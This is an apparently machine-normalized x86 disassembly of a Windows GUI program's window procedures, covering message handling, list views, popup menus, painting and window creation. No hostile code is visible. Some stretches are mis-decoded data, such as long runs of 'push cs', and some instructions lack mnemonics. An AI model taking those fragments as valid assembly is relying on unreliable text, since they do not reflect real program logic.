shl edx 0x10
or eax edx
push eax
mov eax [ rw-data ]
push 0x0
push 0x412
push eax
call esi
mov ecx [ rw-data ]
push rw-data
push 0x1
push 0x411
push ecx
call esi
mov edx [ rw-data ]
push rw-data
push 0x0
push 0x40c
push edx
call esi
mov eax [ rw-data ]
push 0x0
push 0x3
push 0x403
push eax
call esi
mov ecx [ rw-data ]
push 0x7fff
push 0x2
push 0x403
push ecx
call esi
mov eax [ rw-data ]
lea edx [ esp + 0x48 ]
push edx
push 0x0
push 0x407
push eax
call esi
push edi
call [ SetCapture@IAT ]
mov ebp [ esp + 0x17c ]
jmp r-xdata
push edi
call [ GetDC@IAT ]
push 0x0
push 0x0
push 0x31
push edi
mov ebx eax
call esi
push eax
push ebx
call [ SelectObject@IAT ]
lea ecx [ esp + 0x40 ]
push ecx
lea edx [ esp + 0x74 ]
push edx
mov [ esp + 0x18 ] eax
call [ lstrlenA@IAT ]
push eax
lea eax [ esp + 0x78 ]
push eax
push ebx
call [ GetTextExtentPoint32A@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
push ebx
call [ SelectObject@IAT ]
push ebx
push edi
call [ ReleaseDC@IAT ]
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x30 ]
mov ebx [ esp + 0x40 ]
mov ecx edx
sub ecx ebp
sub ecx eax
cmp ebx ecx
jle r-xdata
or ebp 0xffffffff
lea ebx [ eax - 0x1 ]
mov [ esp + 0x18 ] ebp
xor ebx ebx
mov ebp eax
mov [ esp + 0x18 ] 0x1
jmp r-xdata
mov ecx [ rw-data ]
mov eax ecx
and eax 0x7
cmp esi 0x25
jne r-xdata
mov ecx [ rw-data ]
push ecx
call [ SetFocus@IAT ]
jmp r-xdata
push 0x0
push 0xcf
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push 0x0
push 0xffffffff
call sub_423380
add esp 0x14
jmp r-xdata
mov ebx [ esp + 0x178 ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x1004
push ebx
call ebp
mov edi eax
xor esi esi
test edi edi
jle r-xdata
mov ecx [ esp + 0x178 ]
push 0xffffffff
push 0x103
push 0x111
push ecx
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x164
retn 0x10
cmp esi 0x53
jne r-xdata
mov eax [ esp + 0x178 ]
push 0x0
push 0xd0
push 0x111
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x164
retn 0x10
mov ecx [ esp + 0x178 ]
push 0x0
push 0xd1
push 0x111
push ecx
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x164
retn 0x10
push 0x0
push 0x112
jmp r-xdata
mov eax [ esp + 0x178 ]
push 0x0
push 0xe5
push 0x111
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x164
retn 0x10
mov ecx [ esp + 0x178 ]
push 0x0
push 0xfb
push 0x111
push ecx
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x164
retn 0x10
push 0xffffffff
push 0xf9
cmp esi 0x41
jne r-xdata
mov ebp [ esp + 0x17c ]
mov [ rw-data ] edx
jmp r-xdata
lea esp [ esp ]
cmp ebx ebp
je r-xdata
inc eax
cmp eax 0x4
jne r-xdata
dec eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x180 ]
push 0x111
push edx
call [ GetParent@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x164
retn 0x10
lea esp [ esp ]
cmp esi 0x4d
mov eax 0xce
je r-xdata
mov eax 0xcc
push 0x0
push eax
jmp r-xdata
add ebx [ esp + 0x18 ]
cmp ebx ebp
jne r-xdata
mov eax [ esp + 0x40 ]
mov edx [ esp + 0x10 ]
push ebx
lea ecx [ ebx + eax ]
push ecx
push edx
call sub_4217f0
add esp 0xc
and ecx 0xfffffff8
or ecx eax
push 0x0
push eax
mov [ rw-data ] ecx
call sub_425b70
add esp 0x8
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x164
retn 0x10
xor eax eax
mov eax 0x2
jmp r-xdata
mov eax 0x2
mov [ esp + 0x58 ] eax
mov [ esp + 0x54 ] eax
lea eax [ esp + 0x48 ]
push eax
push esi
push 0x102b
push ebx
call ebp
inc esi
cmp esi edi
jl r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x164
retn 0x10
push 0x0
push eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx [ rw-data ]
push 0x2
push ebx
push 0x102c
push edx
call esi
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
sub_426813
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
add eax [ edx ]
add eax [ edx ]
push cs
push cs
push cs
push cs
push cs
add al 0xe
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
add eax 0x80e0706
or [ esi ] ecx
push cs
push cs
push cs
push cs
push cs
or cl [ esi ]
push cs
or ecx [ esi ]
push cs
or cl [ esi + ecx ]
push cs
push cs
push cs
push cs
or eax 0xe0e0e0e
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
or [ eax - 0x74aa6f70 ] dl
in al dx
push 0xffffffff
push sub_4bfd18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1fc
mov eax [ ebp + 0xc ]
cmp eax 0x4e
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
ja r-xdata
add eax 0xfffffeef
cmp eax 0xf1
ja r-xdata
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push eax
push ecx
push edx
call [ DefWindowProcA@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
movzx ecx [ eax + lookup_table_4285c0 ]
jmp [ ecx * 4 + jump_table_4285ac ]
mov eax [ ebp + 0x10 ]
xor ebx ebx
sub eax ebx
je r-xdata
dec eax
cmp eax 0x2a
ja r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0x8 ]
mov edi eax
movzx ecx ax
shr edi 0x10
xor edx edx
xor esi esi
mov [ ebp - 0xb4 ] ecx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
movzx ecx ax
shr eax 0x10
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x21 ] 0x0
mov edi 0x1
mov ebx rw-data
mov [ ebp - 0x20 ] 0x2
mov edi [ ebp + 0x10 ]
movzx eax di
add eax 0xffffff34
cmp eax 0x57
ja r-xdata
mov ecx [ ebp + 0x14 ]
cmp [ ecx + 0x8 ] 0xfffffffb
jne r-xdata
sub eax 0x2
je r-xdata
movzx eax [ eax + lookup_table_4284fc ]
jmp [ eax * 4 + jump_table_4284e4 ]
mov esi [ ebp + 0x8 ]
push 0x0
push 0x0
push esi
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
jmp r-xdata
mov eax esi
shl eax 0x4
cmp [ eax + rw-data ] ecx
jg r-xdata
mov edx [ ebp - 0x20 ]
add ebx 0x10
inc edi
dec edx
mov [ ebp - 0x20 ] edx
jne r-xdata
cmp ecx [ ebx ]
jg r-xdata
movzx eax [ eax + lookup_table_4286d8 ]
jmp [ eax * 4 + jump_table_4286b4 ]
call [ CreatePopupMenu@IAT ]
mov ebx [ rw-data ]
and ebx 0x7
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] ebx
mov ecx 0xc
lea edi [ ebp - 0xac ]
[ edi ]
xor esi esi
shl ebx 0x7
mov [ ebp - 0xac ] 0x30
mov [ ebp - 0xa8 ] 0x13
mov [ ebp - 0xa4 ] esi
add ebx rw-data
lea esp [ esp ]
mov esi [ ebp + 0x14 ]
cmp [ esi + 0x8 ] 0xfffffdd9
jne r-xdata
dec eax
jne r-xdata
mov ebx [ ebp + 0x14 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebp + 0x8 ]
push 0x0
push ecx
push 0x2
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x5600a700
push 0x0
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x2
jne r-xdata
mov eax [ ebp + 0x14 ]
movzx ecx ax
mov [ ebp + 0x14 ] ecx
mov ecx [ rw-data ]
shr eax 0x10
test ecx ecx
mov [ ebp + 0x10 ] eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebp - 0xf4 ]
push ecx
push edx
call [ BeginPaint@IAT ]
mov edi [ GetSysColor@IAT ]
push 0x15
mov esi eax
call edi
mov ebx [ CreatePen@IAT ]
push eax
push 0x1
push 0x0
call ebx
push 0x14
mov [ ebp + 0x14 ] eax
call edi
push eax
push 0x1
push 0x0
call ebx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call [ SelectObject@IAT ]
xor ebx ebx
mov [ ebp - 0x20 ] eax
mov [ ebp + 0xc ] ebx
jmp r-xdata
inc esi
cmp esi 0x2
mov [ ebp - 0x20 ] esi
jb r-xdata
cmp ecx [ eax + rw-data ]
jg r-xdata
cmp [ ebx - 0x8 ] ecx
jg r-xdata
mov al [ ebp - 0x21 ]
test al al
jne r-xdata
cmp [ ebx - 0x4 ] eax
jg r-xdata
mov ecx edi
shr ecx 0x10
test ecx ecx
jne r-xdata
mov edi [ rw-data ]
and edi 0x7
lea eax [ edi + edi * 2 ]
lea edx [ ebp - 0x40 ]
lea ecx [ eax * 4 + rw-data ]
push edx
mov [ ebp - 0x38 ] ecx
call sub_4209f0
mov eax [ rw-data ]
xor esi esi
push esi
push esi
push 0x1004
push eax
call [ SendMessageA@IAT ]
cmp eax esi
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] 0xffffffff
mov [ ebp - 0x14 ] esi
jle r-xdata
mov eax [ rw-data ]
and eax 0x7
lea edx [ ebp - 0x18 ]
lea ecx [ eax + eax * 2 ]
push edx
lea ecx [ ecx * 4 + rw-data ]
call sub_4209f0
mov eax [ rw-data ]
xor esi esi
push esi
push esi
push 0x1004
push eax
call [ SendMessageA@IAT ]
mov ebx [ ebp - 0x18 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x14 ] esi
mov edx [ rw-data ]
mov esi [ SendMessageA@IAT ]
push 0x1
push 0xffffffff
push 0x100c
push edx
call esi
cmp eax 0xffffffff
je r-xdata
mov ecx [ rw-data ]
mov esi [ SendMessageA@IAT ]
push 0x1
push 0xffffffff
push 0x100c
push ecx
call esi
cmp eax 0xffffffff
je r-xdata
mov ecx [ rw-data ]
mov esi [ SendMessageA@IAT ]
push 0x1
push 0xffffffff
push 0x100c
push ecx
call esi
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
mov ecx [ rw-data ]
push rw-data
push 0x0
push 0x411
push ecx
call [ SendMessageA@IAT ]
call [ ReleaseCapture@IAT ]
mov eax [ rw-data ]
test eax eax
mov esi [ ShowWindow@IAT ]
je r-xdata
mov eax [ esi * 4 + rw-data ]
lea edi [ esi + 0x1 ]
push eax
mov [ ebp - 0x9c ] edi
mov [ ebp - 0x88 ] eax
call [ lstrlenA@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x84 ] eax
mov eax [ ebx ]
xor edx edx
test eax eax
setl dl
lea eax [ ebp - 0xac ]
push eax
push 0x1
push esi
push ecx
dec edx
and edx 0x8
mov [ ebp - 0xa0 ] edx
call [ InsertMenuItemA@IAT ]
mov esi edi
add ebx 0x4
cmp esi 0x20
jl r-xdata
lea edx [ ebp - 0x44 ]
push edx
call [ GetCursorPos@IAT ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x44 ]
mov edi [ ebp - 0x1c ]
push 0x0
push eax
push 0x0
push ecx
push edx
push 0x100
push edi
call [ TrackPopupMenu@IAT ]
push edi
mov esi eax
call [ DestroyMenu@IAT ]
test esi esi
je r-xdata
call sub_420a10
mov edi [ rw-data ]
push ebx
push ebx
and edi 0xfffffff8
mov [ rw-data ] edi
mov eax [ esi ]
push 0x130b
push eax
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
or ecx eax
mov [ rw-data ] ecx
and ecx 0x7
mov al [ ecx + rw-data ]
test al al
jne r-xdata
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x8 ]
add eax 0x6d
cmp eax 0x6a
ja r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x80
push 0x0
push 0x0
push 0x0
push 0x190
push 0x0
push 0x0
push 0x0
push 0xc
call [ CreateFontA@IAT ]
test eax eax
mov esi [ SendMessageA@IAT ]
mov [ rw-data ] eax
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ecx
push 0xfffffffc
push edx
call [ SetWindowLongA@IAT ]
jmp r-xdata
push eax
call [ DeleteObject@IAT ]
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x8 ]
mov edi [ eax + 0x18 ]
add eax 0x1c
mov edx [ eax ]
mov [ ebp - 0x34 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x30 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
push ecx
mov [ ebp + 0x14 ] ecx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] eax
call sub_421f40
mov ebx eax
push ebx
call sub_457f40
add esp 0x8
push ebx
mov [ ebp + 0x8 ] eax
call [ lstrlenA@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
mov ecx 0xfffffffc
sub ecx eax
add esi ecx
test esi esi
jg r-xdata
mov edi [ SetWindowPos@IAT ]
mov ebx [ ebp + 0x8 ]
lea edx [ ebp - 0x34 ]
push edx
push ebx
call [ GetClientRect@IAT ]
mov esi [ ebp + 0x14 ]
mov eax [ rw-data ]
mov edi [ SetWindowPos@IAT ]
push 0x4
push 0xc8
add esi 0xfffffff0
push esi
push 0x0
push 0x10
push 0x0
push eax
call edi
mov edx [ rw-data ]
lea ecx [ ebp - 0x34 ]
push ecx
push 0x0
push 0x1328
push edx
call [ SendMessageA@IAT ]
mov eax [ ebp - 0x30 ]
mov ecx [ rw-data ]
push 0x4
push eax
push esi
push 0x0
push 0x10
push 0x0
push ecx
call edi
lea edx [ ebp - 0x34 ]
push edx
push ebx
call [ GetClientRect@IAT ]
mov ecx [ rw-data ]
lea eax [ ebp - 0x34 ]
push eax
push 0x0
push 0x1328
push ecx
call [ SendMessageA@IAT ]
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov edi ebx
shl edi 0x4
lea eax [ edi + rw-data ]
mov ecx eax
mov edx [ ecx ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x5c ] eax
mov eax [ ecx + 0x8 ]
mov ecx [ ecx + 0xc ]
inc eax
inc ecx
mov [ ebp - 0x54 ] ecx
push 0x10
lea ecx [ ebp - 0x60 ]
push ecx
push esi
mov [ ebp - 0x60 ] edx
mov [ ebp - 0x58 ] eax
call [ FillRect@IAT ]
test ebx ebx
jne r-xdata
mov ecx [ ebp - 0xb4 ]
xor edx edx
nop
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call [ ReleaseCapture@IAT ]
jmp r-xdata
cmp [ eax + rw-data ] edi
jg r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ rw-data ]
push 0x1
push 0xffffffff
push 0x100c
push edx
call [ SendMessageA@IAT ]
jmp r-xdata
cmp edi 0x3
jne r-xdata
mov ebx [ ebp - 0x40 ]
jmp r-xdata
mov edx eax
mov eax [ ebp - 0x38 ]
push 0x2
sub edx eax
mov eax [ rw-data ]
push edx
push 0x102c
push eax
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0xa4 ]
push eax
xor edi edi
push edi
push 0x1005
push ecx
mov [ ebp - 0xa4 ] 0x4
mov [ ebp - 0x9c ] edi
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
push edx
xor ebx ebx
push ebx
mov [ ebp - 0xa0 ] eax
mov eax [ rw-data ]
push 0x1005
mov edi 0x4
push eax
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0x9c ] ebx
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
push edx
push 0x0
mov [ ebp - 0xa0 ] eax
mov eax [ rw-data ]
push 0x1005
push eax
mov [ ebp - 0xa4 ] 0x4
mov [ ebp - 0x9c ] 0x0
call esi
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edi [ SendMessageA@IAT ]
push 0x1
push 0xffffffff
push 0x100c
push edx
call edi
cmp eax 0xffffffff
mov [ ebp - 0x14 ] eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push 0x0
push eax
call esi
test eax eax
jne r-xdata
call sub_420a10
mov eax [ ebp - 0x20 ]
mov ecx eax
shl ecx 0x5
add ecx esi
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl eax 0x4
test ecx ecx
jl r-xdata
call sub_421430
jmp r-xdata
push ebx
push ecx
call sub_4221d0
add esp 0x8
movzx edx [ eax + lookup_table_428540 ]
jmp [ edx * 4 + jump_table_428528 ]
mov [ ebp - 0x6c ] 0x1
mov [ ebp - 0x34 ] r--data
mov [ ebp - 0x30 ] r--data
mov [ ebp - 0x2c ] r--data
mov [ ebp - 0x28 ] r--data
xor edi edi
nop
push 0x0
push eax
mov eax [ rw-data ]
push 0x30
push eax
call esi
mov eax [ ebp + 0x8 ]
lea edx [ esi + 0x1 ]
push edx
add eax ebx
push eax
lea ecx [ ebp - 0x204 ]
push ecx
call [ lstrcpynA@IAT ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x30 ]
mov ebx [ ebp - 0x2c ]
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x4c ] edx
push 0x10
lea edx [ ebp - 0x4c ]
push edx
add eax 0x2
add ebx 0xfffffff4
push edi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x40 ] ecx
call [ FillRect@IAT ]
push 0x40201
lea eax [ ebp - 0x4c ]
push eax
push esi
lea ecx [ ebp - 0x204 ]
push ecx
push edi
call [ DrawTextA@IAT ]
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x2c ]
mov esi [ rw-data ]
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] edx
mov edx [ ebp + 0x14 ]
xor eax eax
inc edx
cmp esi edx
setne al
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x54 ] ecx
dec eax
and eax 0xffffc200
add eax 0x4001
push eax
push 0x3
lea eax [ ebp - 0x60 ]
push eax
push edi
call [ DrawFrameControl@IAT ]
add esi 0x4
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x30 ]
push 0x4
sub eax ecx
push eax
mov eax [ ebp + 0x14 ]
push eax
push ecx
push 0x0
push 0x0
push edx
call edi
mov edx [ rw-data ]
test edx edx
je r-xdata
cmp ebx 0x1
jne r-xdata
mov edx [ ebp + 0x14 ]
push edx
push esi
call [ SelectObject@IAT ]
mov ecx [ rw-data ]
mov eax 0x1
cmp ecx eax
mov [ ebp + 0x10 ] ebx
jne r-xdata
cmp edi [ eax + rw-data ]
jg r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
mov ecx [ ebp - 0x84 ]
xor eax eax
cmp di 0xcc
mov esi ecx
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0xa4 ]
push eax
push 0x0
push 0x1005
push ecx
mov [ ebp - 0xa4 ] 0x4
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
push edi
call sub_4207d0
add esp 0x4
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
mov esi [ ebp - 0x14 ]
mov ecx [ rw-data ]
push 0x2
sub esi eax
push esi
push 0x102c
push ecx
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ebx [ ebx ]
mov edi [ ebp + 0x10 ]
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] ebx
jmp r-xdata
cmp di 0xd0
jne r-xdata
mov [ ebp - 0x54 ] 0xf
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x68 ] 0x0
mov edi [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x3
mov esi rw-data
add edi 0x4
mov ebx 0x10
lea ebx [ ebx ]
mov [ ebp - 0x54 ] 0xf
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] bl
mov esi [ ebp - 0x84 ]
mov eax [ esi + 0x34 ]
add esi 0x1c
mov [ ebp - 0x4 ] edi
mov edi 0x10
cmp eax edi
jb r-xdata
mov esi [ ebp - 0x84 ]
mov eax [ esi + 0x34 ]
add esi 0x1c
mov edi 0x10
cmp eax edi
jb r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
mov edi [ SendMessageA@IAT ]
movzx ecx si
shr esi 0x10
mov [ ebp - 0x14 ] ecx
and esi 0x7fff
test eax eax
jne r-xdata
push 0x0
push ecx
call esi
mov eax [ rw-data ]
mov eax [ rw-data ]
dec esi
mov [ ebp - 0x20 ] esi
lea esi [ eax + rw-data ]
lea eax [ ebp - 0x20 ]
push eax
mov ecx esi
call sub_41d190
mov ecx esi
call sub_42c3a0
dec eax
mov [ edi ] eax
call sub_421430
jmp r-xdata
mov esi ecx
mov ecx eax
mov eax [ esi + 0xc ]
mov [ rw-data ] 0x1
mov [ rw-data ] eax
jmp r-xdata
mov edi [ rw-data ]
mov ecx [ esi ]
mov esi [ esi + 0x10 ]
and edi 0x7
mov eax [ edi * 4 + rw-data ]
mov edx eax
and edx 0xffff7fff
cmp edx esi
mov [ ebp - 0x1c ] ecx
jne r-xdata
mov eax [ rw-data ]
push rw-data
push ebx
push 0x411
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
cmp [ esi + 0xc ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov ecx [ esi + 0xc ]
and eax 0x7
cmp ecx 0x1
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp + edi * 4 - 0x34 ]
lea edx [ ebp - 0x6c ]
push edx
push edi
push 0x1307
push eax
mov [ ebp - 0x60 ] ecx
call esi
inc edi
cmp edi 0x4
jl r-xdata
mov ecx [ rw-data ]
push r-xdata
push 0xfffffffc
push ecx
call [ SetWindowLongA@IAT ]
mov edx [ ebx + 0x4 ]
push 0x0
mov edi [ CreateWindowExA@IAT ]
push edx
push 0x4
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push 0x12c
push 0x0
push 0x0
push 0x0
push 0x40200403
push 0x0
push r--data
push 0x0
call edi
mov ecx [ rw-data ]
push 0x0
push ecx
push 0x30
push eax
mov [ rw-data ] eax
call esi
mov edx [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
push 0x0
push edx
push 0x0
push ebx
push 0x80000000
push 0x80000000
push 0x80000000
push 0x80000000
push 0x1
push r--data
push r--data
push 0x0
call edi
mov [ rw-data ] eax
xor eax eax
mov ecx 0xb
lea edi [ ebp - 0xe0 ]
[ edi ]
mov [ ebp - 0xd8 ] ebx
mov [ ebp - 0xe0 ] 0x2c
mov [ ebp - 0xdc ] 0x10
mov [ ebp - 0x44 ] r--data
mov [ ebp - 0x40 ] r--data
xor edi edi
mov ebx rw-data
lea ecx [ ecx ]
mov ecx [ rw-data ]
inc ebx
cmp ecx ebx
mov [ ebp + 0x10 ] ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push esi
call [ SelectObject@IAT ]
mov eax [ rw-data ]
xor ebx ebx
cmp eax 0x2
jne r-xdata
mov ebx [ ebp + 0x10 ]
push 0x0
push 0x3
add ebx 0xb
push ebx
push esi
call [ MoveToEx@IAT ]
mov eax [ ebp + 0x10 ]
add eax 0x4
push 0xa
push eax
push esi
mov [ ebp + 0x10 ] eax
call [ LineTo@IAT ]
push 0x0
push 0x9
push ebx
push esi
call [ MoveToEx@IAT ]
mov eax [ ebp + 0x10 ]
push 0x2
push eax
jmp r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov ecx [ rw-data ]
lea eax [ esi + 0x1 ]
cmp ecx eax
jne r-xdata
push 0x0
push 0x0
push esi
mov [ rw-data ] 0x0
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
jmp r-xdata
call [ ReleaseCapture@IAT ]
mov [ ebp - 0x21 ] 0x1
push esi
call [ SetCapture@IAT ]
push 0x0
push 0x0
push esi
mov [ rw-data ] edi
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
mov ebx [ ebp + 0x14 ]
test ebx ebx
setne dl
mov [ ebp - 0x40 ] dl
mov ecx [ ebp - 0x40 ]
push ecx
push eax
push esi
call sub_425f00
add esp 0xc
jmp r-xdata
cmp di 0xcd
jne r-xdata
call sub_428bd0
push 0x0
call sub_4290f0
mov ecx [ rw-data ]
add esp 0x4
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
mov edx [ rw-data ]
cmp edx [ ebx + 0x8 ]
mov [ ebp - 0x18 ] esi
jne r-xdata
mov ebx [ ebx ]
jmp r-xdata
mov ecx [ ebp - 0x40 ]
mov eax [ ebp - 0x14 ]
cmp eax ecx
mov esi 0x10
jge r-xdata
cmp di 0xd1
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x34 ] esi
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] edx
lea eax [ ebp - 0x44 ]
push eax
call [ GetCursorPos@IAT ]
jmp r-xdata
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x34 ] 0x0
push 0x1038
mov [ ebp - 0x34 ] 0x2
push 0x100e
jmp r-xdata
push 0x5
push eax
call esi
push eax
mov eax [ ebp + 0x8 ]
push sub_430760
push eax
push 0x102
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ CreateDialogParamA@IAT ]
mov [ rw-data ] eax
mov eax [ ecx + rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
je r-xdata
xor eax 0x8000
mov esi eax
mov ecx [ rw-data ]
mov ebx [ SendMessageA@IAT ]
push rw-data
push 0x0
push 0x411
push ecx
call ebx
cmp [ esi + 0x8 ] 0xfffffffb
jne r-xdata
cmp ecx 0x10001
jne r-xdata
test [ esi + 0x24 ] 0x1
je r-xdata
mov eax ebx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0xd0 ] ecx
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
inc eax
mov [ ebp - 0xc4 ] eax
lea eax [ ebp - 0xe0 ]
push eax
push 0x0
mov [ ebp - 0xc8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0xcc ] edx
mov edx [ ebp + edi * 4 - 0x44 ]
push 0x404
push ecx
mov [ ebp - 0xd4 ] edi
mov [ ebp - 0xbc ] edx
call esi
inc edi
add ebx 0x10
cmp edi 0x2
jb r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
push 0x3
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x50000001
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
cmp ebx 0x2
mov [ ebp + 0xc ] ebx
jb r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0x10
lea edx [ ebx + 0x3 ]
push edx
push esi
call [ MoveToEx@IAT ]
push 0x10
